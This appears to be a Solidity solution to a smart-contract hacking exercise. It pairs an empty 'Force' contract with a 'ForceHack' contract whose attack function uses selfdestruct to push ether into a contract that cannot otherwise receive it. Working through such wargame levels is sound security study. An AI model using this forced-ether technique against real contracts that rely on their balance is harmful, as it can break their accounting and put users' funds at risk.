// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force {
    /*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/
}

// Force Hack Contract
contract ForceHack {
    Force public immutable force;

    constructor(address _force) {
        force = Force(_force);
    }

    function attack() external payable {
        selfdestruct(payable(address(force)));
    }
}